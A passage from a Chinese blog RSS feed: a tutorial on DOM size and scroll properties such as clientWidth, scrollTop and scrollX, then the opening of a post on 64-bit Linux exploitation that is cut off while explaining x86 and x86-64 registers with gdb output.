&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; offsetLeft &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;offsetLeft&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;clientwidth-clientheight&quot;&gt;clientWidth / clientHeight&lt;/h2&gt;
&lt;h3 id=&quot;clientwidth&quot;&gt;clientWidth&lt;/h3&gt;
&lt;p&gt;Element.clientWidth 是一个只读属性，返回元素的内部宽度，以像素计。该属性包括内边距，但不包括垂直滚动条（如果有）、边框和外边距。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; clientWidth &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;clientWidth&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/970B96B99288400795E5D2CA5FBE6238?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;clientheight&quot;&gt;clientHeight&lt;/h3&gt;
&lt;p&gt;Element.clientWidth 是一个只读属性，对于没有定义 CSS 或者内联布局盒子的元素为0，同时它是元素内部的高度(单位像素)，包含内边距，但不包括水平滚动条、边框和外边距。&lt;/p&gt;
&lt;p&gt;clientHeight 可以通过 CSS height + CSS padding - 水平滚动条高度 (如果存在)来计算。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; clientHeight &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;clientHeight&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/C0AE3BA00BC0475986ABF42B4465696A?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;clienttop-clientleft&quot;&gt;clientTop / clientLeft&lt;/h2&gt;
&lt;h3 id=&quot;clienttop&quot;&gt;clientTop&lt;/h3&gt;
&lt;p&gt;Element.clientTop 是一个只读属性，表示一个元素顶部边框的宽度（以像素表示）。不包括顶部外边距或内边距。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; clientTop &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;clientTop&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/80D13E491CAE4D02BD499B98BAAA31AB?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;clientleft&quot;&gt;clientLeft&lt;/h3&gt;
&lt;p&gt;Element.clientLeft 是一个只读属性，表示一个元素的左边框的宽度，以像素表示。如果元素的文本方向是从右向左（RTL, right-to-left），并且由于内容溢出导致左边出现了一个垂直滚动条，则该属性包括滚动条的宽度。clientLeft 不包括左外边距和左内边距。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; clientLeft &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;clientLeft&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/590E4CD6D5AD41ABA2689EC8D0B2C085?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;innerwidth-innerheight&quot;&gt;innerWidth / innerHeight&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/9BD9883353194171B51873913009ACB8?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;innerwidth&quot;&gt;innerWidth&lt;/h3&gt;
&lt;p&gt;window.innerWidth 是一个只读属性，表示浏览器视口（viewport）宽度（单位：像素），如果存在垂直滚动条则包括它。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; innerWidth &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;innerWidth&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;innerheight&quot;&gt;innerHeight&lt;/h3&gt;
&lt;p&gt;window.innerHeight 是一个只读属性，表示浏览器窗口的视口（viewport）高度（以像素为单位），如果存在水平滚动条则包括它。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; innerHeight &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;innerHeight&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;outerwidth-outerheight&quot;&gt;outerWidth / outerHeight&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/9BD9883353194171B51873913009ACB8?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;outerwidth&quot;&gt;outerWidth&lt;/h3&gt;
&lt;p&gt;Window.outerWidth 是一个只读属性，表示整个浏览器窗口的宽度，包括侧边栏（如果存在）、窗口镶边（window chrome）和调正窗口大小的边框（window resizing borders/handles）。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; outerWidth &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;outerWidth&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;outerheight&quot;&gt;outerHeight&lt;/h3&gt;
&lt;p&gt;Window.outerHeight 是一个只读属性，表示获取整个浏览器窗口的高度（单位：像素），包括侧边栏（如果存在）、窗口镶边（window chrome）和窗口调正边框（window resizing borders/handles）。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; outerHeight &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;outerHeight&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/00A0FF820A354A6B8BE794656DA52A1A?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;scrolltop&quot;&gt;scrollTop&lt;/h3&gt;
&lt;p&gt;Element.scrollTop 属性可以获取或设置一个元素的内容垂直滚动的像素数。&lt;/p&gt;
&lt;p&gt;一个元素的 scrollTop 值是这个元素的顶部到它的最顶部可见内容（的顶部）的距离的度量。当一个元素的内容没有产生垂直方向的滚动条，那么它的 scrollTop 值为0。&lt;/p&gt;
&lt;p&gt;scrollTop 可以被设置为任何整数值，同时注意：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如果一个元素不能被滚动（例如，它没有溢出，或者这个元素有一个&quot;non-scrollable&quot;属性）， scrollTop将被设置为0。&lt;/li&gt;
&lt;li&gt;设置scrollTop的值小于0，scrollTop 被设为0&lt;/li&gt;
&lt;li&gt;如果设置了超出这个容器可滚动的值, scrollTop 会被设为最大值&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt;  scrollTop &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;scrollTop&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 获取&lt;/span&gt;
&lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;scrollTop&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; intValue&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 设置&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/8367484635944936B19B91C796320E05?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;scrollleft&quot;&gt;scrollLeft&lt;/h3&gt;
&lt;p&gt;Element.scrollLeft 属性可以读取或设置元素滚动条到元素左边的距离。&lt;/p&gt;
&lt;p&gt;注意如果这个元素的内容排列方向（direction） 是rtl (right-to-left) ，那么滚动条会位于最右侧（内容开始处），并且scrollLeft值为0。此时，当你从右到左拖动滚动条时，scrollLeft会从0变为负数（这个特性在chrome浏览器中不存在）。&lt;/p&gt;
&lt;p&gt;scrollLeft 可以是任意整数，然而：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如果元素不能滚动（比如：元素没有溢出），那么scrollLeft 的值是0。&lt;/li&gt;
&lt;li&gt;如果给scrollLeft 设置的值小于0，那么scrollLeft 的值将变为0。&lt;/li&gt;
&lt;li&gt;如果给scrollLeft 设置的值大于元素内容最大宽度，那么scrollLeft 的值将被设为元素最大宽度。&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt;  scrollLeft &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;scrollLeft&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 获取&lt;/span&gt;
&lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;scrollLeft&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; intValue&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;// 设置&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/00A0FF820A354A6B8BE794656DA52A1A?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;scrollwidth&quot;&gt;scrollWidth&lt;/h3&gt;
&lt;p&gt;Element.scrollWidth 是一个只读属性，以px为单位返回元素的内容区域宽度或元素的本身的宽度中更大的那个值。若元素的宽度大于其内容的区域（例如，元素存在滚动条时）, scrollWidth 的值要大于 clientWidth。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; scrollWidth &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;scrollWidth&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;scrollheight&quot;&gt;scrollHeight&lt;/h3&gt;
&lt;p&gt;Element.scrollHeight 是一个只读属性，它是一个元素内容高度的度量，包括由于溢出导致的视图中不可见内容。没有垂直滚动条的情况下，scrollHeight值与元素视图填充所有内容所需要的最小值clientHeight相同。包括元素的padding，但不包括元素的border和margin。scrollHeight也包括 ::before 和 ::after这样的伪元素。&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; scrollHeight &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;element&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;scrollHeight&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://note.youdao.com/yws/api/personal/file/0F43C8692C024214BD2DA12C62CCC217?method=download&amp;amp;shareKey=cb35067568c854b1179977148689e8bb&quot;/&gt;&lt;/p&gt;

&lt;h3 id=&quot;scrollx&quot;&gt;scrollX&lt;/h3&gt;
&lt;p&gt;返回文档/页面水平方向滚动的像素值，其中 pageXOffset 属性是 scrollY 属性的别名&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; scrollX &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;scrollX&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;完整的获取文档/页面在水平方向已滚动的像素值的兼容性代码：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; x &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; (&lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;pageXOffset&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;undefined&lt;/span&gt;) &lt;span class=&quot;op&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;pageXOffset&lt;/span&gt; : (&lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;documentElement&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;va&quot;&gt;body&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;parentNode&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;body&lt;/span&gt;).&lt;span class=&quot;at&quot;&gt;scrollLeft&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;scrolly&quot;&gt;scrollY&lt;/h3&gt;
&lt;p&gt;返回文档/页面在垂直方向已滚动的像素值，其中 pageYOffset 属性是 scrollY 属性的别名&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; scrollX &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;scrollY&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;完整的获取文档/页面在垂直方向已滚动的像素值的兼容性代码：&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode javascript&quot;&gt;
&lt;code class=&quot;sourceCode javascript&quot;&gt;&lt;span class=&quot;kw&quot;&gt;var&lt;/span&gt; y &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; (&lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;pageYOffset&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;undefined&lt;/span&gt;) &lt;span class=&quot;op&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;window&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;pageYOffset&lt;/span&gt; : (&lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;documentElement&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;va&quot;&gt;body&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;parentNode&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;document&lt;/span&gt;.&lt;span class=&quot;at&quot;&gt;body&lt;/span&gt;).&lt;span class=&quot;at&quot;&gt;scrollTop&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
</description>
<pubDate>Sun, 15 Apr 2018 14:30:00 +0000</pubDate>
<dc:creator>laixiangran</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/laixiangran/p/8849887.html</dc:identifier>
</item>
<item>
<title>Linux64位程序中的漏洞利用 - 有价值炮灰</title>
<link>http://www.cnblogs.com/pannengzhi/p/2018-04-15-x64-stack-exploit.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/pannengzhi/p/2018-04-15-x64-stack-exploit.html</guid>
<description>&lt;p&gt;之前在&lt;a href=&quot;https://www.pppan.net/blog/detail/2018-03-17-exploit-the-stack&quot;&gt;栈溢出漏洞的利用和缓解&lt;/a&gt;中介绍了栈溢出漏洞和一些常见的漏洞缓解&lt;br/&gt;技术的原理和绕过方法, 不过当时主要针对32位程序(ELF32). 秉承着能用就不改的态度,&lt;br/&gt;IPv4还依然是互联网的主导, 更何况应用程序. 所以理解32位环境也是有必要的.&lt;br/&gt;不过, 现在毕竟已经是2018年了, 64位程序也逐渐成为主流, 尤其是在Linux环境中.&lt;br/&gt;因此本篇就来说说64位下的利用与32位下的利用和缓解绕过方法有何异同.&lt;/p&gt;

&lt;h2 id=&quot;寄存器&quot;&gt;寄存器&lt;/h2&gt;
&lt;p&gt;我们所说的32位和64位, 其实就是寄存器的大小. 对于32位寄存器大小为32/8=4字节,&lt;br/&gt;那64位自然是64/8=8字节了. 寄存器的大小对程序的直接影响就是地址空间,&lt;br/&gt;因为CPU获取数据/地址还是要通过寄存器来传递, 32位程序地址空间最多也只有&lt;br/&gt;2^32-1=4GB(不考虑内核空间), 64位则将地址空间提高了几十亿倍, 充分利用了&lt;br/&gt;机器的内存.&lt;/p&gt;
&lt;h3 id=&quot;x86&quot;&gt;x86&lt;/h3&gt;
&lt;p&gt;对于x86架构的CPU, 通常会用到的寄存器有下列这些:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;(gdb) info registers 
eax            0xf7fa6dbc   -134582852
ecx            0x5cb15f85   1555128197
edx            0xffffc834   -14284
ebx            0x0  0
esp            0xffffc808   0xffffc808
ebp            0xffffc808   0xffffc808
esi            0x1  1
edi            0xf7fa5000   -134590464
eip            0x56555563   0x56555563 &amp;lt;main+3&amp;gt;
eflags         0x292    [ AF SF IF ]
cs             0x23 35
ss             0x2b 43
ds             0x2b 43
es             0x2b 43
fs             0x0  0
gs             0x63 99&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这些寄存器可以分为四类:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;通用寄存器:
EAX EBX ECX EDX

索引和指针:
ESI EDI EBP ESP EIP

段寄存器:
CS SS DS ES FS GS

指示器:
EFLAGS&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中EAX~EDX四个通用寄存器支持部分引用, 如EAX低16位可通过AX来引用,&lt;br/&gt;AL的高8位和低8位又可以分别通过AH和AL来引用.&lt;/p&gt;
&lt;p&gt;有的文档将ESI,EDI也称为通用寄存器, 因为他们也是程序可自由读写的,&lt;br/&gt;不过他们不支持部分引用. EBP/ESP分别称为栈基指针和栈指针, 分别指向&lt;br/&gt;当前栈帧的栈底和栈顶. EIP为PC指针, 指向将要执行的下一条指令.&lt;/p&gt;
&lt;p&gt;段寄存器(Segment registers)保存了不同目标的段地址, 只有16种取值,&lt;br/&gt;只能被通用寄存器或者特殊指令设置.&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;CS&lt;/td&gt;
&lt;td&gt;Code Segment&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;SS&lt;/td&gt;
&lt;td&gt;Stack Segment&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;DS&lt;/td&gt;
&lt;td&gt;Data Segment&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;ES,FS,GS&lt;/td&gt;
&lt;td&gt;主要用作远指针寻址&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;指示器EFLAGS保存了指令运行的一些状态(flag), 比如进位,符号等, Intel文档定义如下:&lt;/p&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;2&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;CF&lt;/td&gt;
&lt;td&gt;Carry flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;PF&lt;/td&gt;
&lt;td&gt;Parity flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;AF&lt;/td&gt;
&lt;td&gt;Auxiliary carry flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;ZF&lt;/td&gt;
&lt;td&gt;Zero flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;SF&lt;/td&gt;
&lt;td&gt;Sign flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;TF&lt;/td&gt;
&lt;td&gt;Trap flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;IF&lt;/td&gt;
&lt;td&gt;Interrupt enable flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;10&lt;/td&gt;
&lt;td&gt;DF&lt;/td&gt;
&lt;td&gt;Direction flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;OF&lt;/td&gt;
&lt;td&gt;Overflow flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;12-13&lt;/td&gt;
&lt;td&gt;IOPL&lt;/td&gt;
&lt;td&gt;I/O Priviledge level&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;NT&lt;/td&gt;
&lt;td&gt;Nested task flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;16&lt;/td&gt;
&lt;td&gt;RF&lt;/td&gt;
&lt;td&gt;Resume flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;VM&lt;/td&gt;
&lt;td&gt;Virtual 8086 mode flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;18&lt;/td&gt;
&lt;td&gt;AC&lt;/td&gt;
&lt;td&gt;Alignment check flag (486+)&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;19&lt;/td&gt;
&lt;td&gt;VIF&lt;/td&gt;
&lt;td&gt;Virutal interrupt flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;20&lt;/td&gt;
&lt;td&gt;VIP&lt;/td&gt;
&lt;td&gt;Virtual interrupt pending flag&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;21&lt;/td&gt;
&lt;td&gt;ID&lt;/td&gt;
&lt;td&gt;ID flag&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;这个32位寄存器中上面没提到的位是由Intel保留的.&lt;/p&gt;
&lt;h3 id=&quot;x86-64&quot;&gt;x86-64&lt;/h3&gt;
&lt;p&gt;x86-64架构下的寄存器种类和32位差不多:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;(gdb) info  registers 
rax            0x555555554660   93824992233056
rbx            0x0  0
rcx            0x0  0
rdx            0x7fffffffd708   140737488344840
rsi            0x7fffffffd6f8   140737488344824
rdi            0x1  1
rbp            0x7fffffffd610   0x7fffffffd610
rsp            0x7fffffffd610   0x7fffffffd610
r8             0x5555555546e0   93824992233184
r9             0x7ffff7de8cb0   140737351945392
r10            0x8  8
r11            0x1  1
r12            0x555555554530   93824992232752
r13            0x7fffffffd6f0   140737488344816
r14            0x0  0
r15            0x0  0
rip            0x555555554664   0x555555554664 &amp;lt;main+4&amp;gt;
eflags         0x246    [ PF ZF IF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0&lt;/code&gt;
&lt;/pre&gt;
